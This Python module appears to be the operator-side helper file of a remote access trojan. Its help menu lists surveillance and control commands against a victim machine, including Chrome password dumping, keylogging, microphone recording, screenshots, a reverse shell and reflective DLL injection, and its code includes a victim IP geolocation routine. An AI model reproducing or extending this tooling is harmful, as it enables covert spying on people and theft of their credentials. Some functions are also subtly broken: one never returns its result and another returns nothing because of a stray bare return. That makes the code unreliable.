from plyer import notification
import os
from colorama import Style, Fore
import colorama
from PIL import Image
from plyer import notification
import geoip2.database


session_help = r"""

Session Commands
=================
-. info - View Client information.
-. help - Print this help message.
-. exit - Exit session.

File Management
=================
-. upload - Upload files.
-. download - Download files.
-. drives - Get all available drive letters.
-. dir < directory > - Change current directory. (-s switch to specify Name with spaces)
-. delete < file > - Delete a file.
-. ls - List files in current directory.

Surveillance
=================
-. screenshot - Take Screen shot.
-. micrecord - Start recording microphone.
-. chromedump - Dump Google Chrome Passwords.

Information Gathering
=================
-. admin - Check if Client has Administrator rights.
-. geolocate - Geolocate.
-. keylog_start - Start Logging Keystrokes.
-. keylog_dump - Dump logged Keystrokes and clear buffer.
-. processinfo - Get Process information.

System
=================
-. shell - Reverse shell.
-. dllinject - Reflective DLL Injection. Load your own Reflective DLL.
-. poweroff - Shutdown the System.
-. reboot - reboot the System.
-. pkill - Kill a Process.

Client
=================
-. kill - Kill Session  / Close Session.
-. die - Kill Client and Close connection.
"""


def clear_screen():
    if(os.name == "nt"):
        os.system("cls")
    else:
        os.system("clear")

def saveAndShowImage(image):
    try:
        im = Image.open(image)  
        im.save(image, "PNG")
        im.show() 
    except Exception as e:
        print("Error converting bmp to png : " + str(e))



def uniquify(path):
    """
    Credits : https://stackoverflow.com/questions/13852700/create-file-but-if-name-exists-add-number/57896232#57896232
    """
    filename, extension = os.path.splitext(path)
    counter = 1

    while os.path.exists(path):
        path = filename + " (" + str(counter) + ")" + extension
        counter += 1


def PrintTextFile(filename):
    try:
        with open(filename, "r") as inn:
            data = inn.read()
            print(data)
    except Exception as e:
        print("[X] Error : " + str(e))


def notify(title, message):
    notification.notify(
        title, 
        message
    )

def GeoLocate(ip):
    database_path = "GeoLite2-City.mmdb"
    database = geoip2.database.Reader(database_path)
    ip_info = database.city(ip)
    ISO_CODE = ip_info.country.iso_code
    country = ip_info.country.name
    pstlcode = ip_info.postal.code
    reigon = ip_info.subdivisions.most_specific.name
    city = ip_info.city.name
    # location = str(ip_info.location.latitude) + " " + str(ip_info.location.longitude)
    location = "https://www.google.com/maps?q="+str(ip_info.location.latitude)+","+str(ip_info.location.longitude)
    print(
        """
        Geolocation 
        ----------------
        ISO Code : {isocode}
        Country : {country}
        Postal Code : {pstl}
        Reigon : {reigon}
        City : {city}
        Location : {loc}
        """.format(isocode = ISO_CODE,
        country = country,
        pstl = pstlcode, 
        reigon = reigon,
        city = city,
        loc = location)
    )

    return 
    """\n
    [+] ISO Code : {isocode}
    [+] Country : {country}
    [+] Postal Code : {pstl}
    [+] Reigon : {reigon}
    [+] City : {city}
    [+] Location : {loc}
    """.format(isocode = ISO_CODE,
        country = country,
        pstl = pstlcode, 
        reigon = reigon,
        city = city,
        loc = location
    )